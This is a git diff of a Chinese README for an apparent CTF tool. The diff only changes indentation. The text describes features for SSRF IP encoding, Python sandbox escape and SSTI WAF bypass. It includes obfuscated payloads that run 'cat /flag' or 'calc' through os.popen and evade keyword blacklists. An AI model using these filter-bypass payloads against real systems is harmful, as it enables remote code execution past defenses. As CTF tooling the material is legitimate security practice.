@@ -80,18 +80,18 @@ https://www.bilibili.com/video/BV1xVy5YiEim/
 - IP编码：ipv4地址编码，SSRF使用
 - 沙箱逃逸：参考https://github.com/Macr0phag3/parselmouth ,  在第一栏输入`__import__('os').popen('cat /flag').read()` 第二栏输入黑名单  `__,os,pop,system` 点击输出自动绕WAF
 
-沙箱逃逸功能中 ，修改 https://github.com/Macr0phag3/parselmouth 项目 ，实现该项目未实现的功能 如
- ` '__buil''tins__' -> '%c%c%c%c%c%c%c%c%c%c%c%c' % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95) `
+   - 沙箱逃逸功能中 ，修改 https://github.com/Macr0phag3/parselmouth 项目 ，实现该项目未实现的功能 如
+     ` '__buil''tins__' -> '%c%c%c%c%c%c%c%c%c%c%c%c' % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95) `
  
-`黑名单 ['read','popen','s','\\'] >> getattr(getattr(__import__('o'+'%c'%115),'p'+'open')('calc'),('r'+'ead'))()`
+     `黑名单 ['read','popen','s','\\'] >> getattr(getattr(__import__('o'+'%c'%115),'p'+'open')('calc'),('r'+'ead'))()`
 
-由原项目的 103
+     由原项目的 103
 
-![图片](https://github.com/user-attachments/assets/284c53f0-9ea9-4202-9304-a241e085e673)
+     ![图片](https://github.com/user-attachments/assets/284c53f0-9ea9-4202-9304-a241e085e673)
 
- 增加为 123
+     增加为 123
  
-![图片](https://github.com/user-attachments/assets/c6ba7ba4-54f6-4fcb-94f8-f5ee99e6be50)
+     ![图片](https://github.com/user-attachments/assets/c6ba7ba4-54f6-4fcb-94f8-f5ee99e6be50)
 
 
 - SSTI：参考https://github.com/Marven11/Fenjing ， 在第一栏输入 `cat /flag` 第二栏输入  `_,os,{{,}},eavl,subprocess` 点击输出自动绕WAF
